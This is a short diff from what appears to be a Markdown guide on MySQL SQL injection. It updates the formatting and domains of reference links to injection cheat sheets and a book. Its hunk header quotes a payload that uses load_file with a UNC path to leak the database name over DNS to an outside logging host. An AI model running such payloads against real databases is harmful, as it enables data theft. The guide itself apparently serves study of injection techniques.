@@ -417,8 +417,8 @@ mysql> select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'));
 ## References
 
 
-- [SQL Injection Cheat Sheet] (http://static.hx99.net/static/drops/tips-7840.html)
-- [MySQL Injection Tips] (http://static.hx99.net/static/drops/tips-7299.html)
-- [MySQL Injection Science] (http://static.hx99.net/static/drops/tips-123.html)
-- [MySQL Injection Summary] (http://www.91ri.org/4073.html)
-- [SQL Injection Attack and Defense] (http://product.dangdang.com/23364650.html)
+- [SQL Injection Cheat Sheet](http://drops.xmd5.com/static/drops/tips-7840.html)
+- [MySQL Injection Tips](http://drops.xmd5.com/static/drops/tips-7299.html)
+- [MySQL Injection Science](http://drops.xmd5.com/static/drops/tips-123.html)
+- [MySQL Injection Summary](http://www.91ri.org/4073.html)
+- [SQL Injection Attack and Defense](http://product.dangdang.com/23364650.html)
